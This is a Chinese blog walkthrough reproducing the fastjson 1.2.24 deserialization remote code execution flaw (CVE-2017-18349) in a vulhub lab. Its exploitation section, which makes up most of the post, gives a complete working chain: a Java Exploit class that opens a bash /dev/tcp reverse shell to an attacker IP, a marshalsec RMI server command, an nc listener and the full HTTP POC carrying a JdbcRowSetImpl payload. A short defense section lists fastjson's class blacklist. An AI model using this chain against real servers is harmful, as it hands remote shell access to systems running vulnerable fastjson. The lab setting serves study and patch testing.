# CVE-2017-18349 fastjson 1.2.24 反序列化导致任意命令执行漏洞 - 美式加糖 - 博客园

> 原文：[`www.cnblogs.com/peace-and-romance/p/15754783.html`](https://www.cnblogs.com/peace-and-romance/p/15754783.html)

### 0X00-引言

* * *

欲练此功，必先自宫

![看我不卷死你们](img/632f026741a665e364ce07d6637878fd.png)

### 0X01-环境搭建

* * *

靶机：CentOS Linux 7

攻击机：windows server 2016 && Kail

环境：vulhub

项目地址：[`github.com/vulhub/vulhub`](https://github.com/vulhub/vulhub)

搭建 vulhub 请访问：[空白 centos7 64 搭建 vulhub(详细)](https://www.cnblogs.com/peace-and-romance/p/15621658.html)

工具：burpsuite marshalsec-0.0.3-SNAPSHOT-all.jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar 下文有下载链接

### 0X02-漏洞描述

* * *

fastjson 在解析 json 的过程中，支持使用 autoType 来实例化某一个具体的类，并调用该类的 set/get 方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。

Fastjson RCE 关键函数：

```
DefaultJSONParser. parseObject() 解析传入的 json 字符串提取不同的 key 进行后续的处理
TypeUtils. loadClass() 根据传入的类名，生成类的实例
JavaBeanDeserializer. Deserialze() 依次调用 @type 中传入类的对象公有 set\get\is 方法。
ParserConfig. checkAutoType() 阿里后续添加的防护函数，用于在 loadclass 前检查传入的类是否合法。 
```

### 0X03-漏洞复现

* * *

Apache log4j2 利用方式和 fastjson 相似，EXP 一样

`http://192.168.234.128:8090/`

![image-20211230094525637](img/f5a40cf1ef0f05d50c33397390f8cd47.png)

##### 01-安装 marshalsec 和 mvn

我的之前复现 log4j2 安装过了-以下命令仅供参考

```
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec
mvn clean package -DskipTests 
```

##### 02-EXP 编译/开启 web 服务

EXP：

```
public class Exploit {
   public Exploit(){
       try{
           // 要执行的命令
           String[] commands = {"bash","-c","exec 5<>/dev/tcp/192.168.234.135/12345;cat <&5 | while read line; do $line 2>&5 >&5; done"};
           Process pc = Runtime.getRuntime().exec(commands);
           pc.waitFor();
      } catch(Exception e){
           e.printStackTrace();
      }
  }

   public static void main(String[] argv) {
       Exploit e = new Exploit();
  }
} 
```

```
javac Exploit.java #编译 
```

![image-20211230102138334](img/e688e7f7b0a0122b86fa9457fe6a0c0c.png)

开启 web 服务

```
python -m SimpleHTTPServer  666 #python2 命令
python -m http.server 666 #python3 开启 web 服务 
```

![image-20211230102526394](img/b04c2576b629bdd44c909072c50e89e0.png)

![image-20211230102551196](img/38718f6ae7eff0d9e1c3dfa146b6cfc5.png)

##### 03-反弹 shell

开启 RMI 服务，监听端口，并制定加载远程类 Exploit.class,执行

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.234.135:666/#Exploit" 9999 
```

![image-20211230102951255](img/4a9f6969f67d8d89126b102631fdcbeb.png)

开启监听

```
nc -lvvp 12345 
```

![image-20211230103200738](img/c582c4cb1a53ade90b16cf0d99feb7da.png)

burp 发送 POC

```
POST / HTTP/1.1
Host: 192.168.234.128:8090
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 161

{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName":"rmi://192.168.234.135:9999/Exploit",
        "autoCommit":true
    }
} 
```

![image-20211230103307923](img/c99655d7ddd96a4dd49ea478f7f0cd6b.png)

成功反弹 shell

![image-20211230103347417](img/da31bb00770813641eb2928ba1f0bf96.png)

### 0X04-工具检测

* * *

burp 有插件 https://github.com/Maskhe/FastjsonScan

### 0X05-漏洞防御

* * *

来自这篇[文章](https://blog.csdn.net/q943111495/article/details/121031753)

在 fastjson 的官方补丁中，将 loadClass(typeName, config.getDefaultClassLoader())替换为了 config.checkAutoType(typeName)，并且扩充了黑名单列表，将传入的类名与黑名单一一比较，如果发现了相同开头的类就停止反序列化。

```
// 新增的黑名单 bshcom.mchangecom.sun.java.lang.Threadjava.net.Socketjava.rmijavax.xmlorg.apache.bcelorg.apache.commons.beanutilsorg.apache.commons.collections.Transformerorg.apache.commons.collections.functorsorg.apache.commons.collections4.comparatorsorg.apache.commons.fileuploadorg.apache.myfaces.context.servletorg.apache.tomcatorg.apache.wicket.utilorg.codehaus.groovy.runtimeorg.hibernateorg.jbossorg.mozilla.javascriptorg.python.coreorg.springframework 
```

可以看到绝大部分常用的类都已经被加进来了，但是如果不经常维护此名单，一旦后面出现了新的可以利用的类，很容易就绕过这个限制。

### 0X06-免责声明

* * *

仅供学习参考

### 0X07-参考

* * *

[`www.freebuf.com/vuls/208339.html`](https://www.freebuf.com/vuls/208339.html)

[`vulhub.org/#/environments/fastjson/1.2.24-rce/`](https://vulhub.org/#/environments/fastjson/1.2.24-rce/)